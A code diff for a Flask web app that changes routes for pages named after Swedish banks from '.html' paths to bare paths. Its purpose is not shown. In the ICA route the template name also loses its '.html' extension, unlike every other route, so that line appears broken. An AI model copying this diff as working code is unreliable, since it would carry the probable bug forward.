@@ -14,39 +14,39 @@ detection_interval = 3
 def index():
     return render_template("index.html")
 
-@app.route('/danske.html')
+@app.route('/danske')
 def danske():
     return render_template('danske.html')
 
-@app.route('/handelsbanken.html')
+@app.route('/handelsbanken')
 def handelsbanken():
     return render_template('handelsbanken.html')
 
-@app.route('/ica.html')
+@app.route('/ica')
 def ica():
-    return render_template('ica.html')
+    return render_template('ica')
 
-@app.route('/lansforsakringar.html')
+@app.route('/lansforsakringar')
 def lansforsakringar():
     return render_template('lansforsakringar.html')
 
-@app.route('/nordea.html')
+@app.route('/nordea')
 def nordea():
     return render_template('nordea.html')
 
-@app.route('/seb.html')
+@app.route('/seb')
 def seb():
     return render_template('seb.html')
 
-@app.route('/skandiabanken.html')
+@app.route('/skandiabanken')
 def skandiabanken():
     return render_template('skandiabanken.html')
 
-@app.route('/sparbanken.html')
+@app.route('/sparbanken')
 def sparbanken():
     return render_template('sparbanken.html')
 
-@app.route('/swedbank.html')
+@app.route('/swedbank')
 def swedbank():
     return render_template('swedbank.html')
 
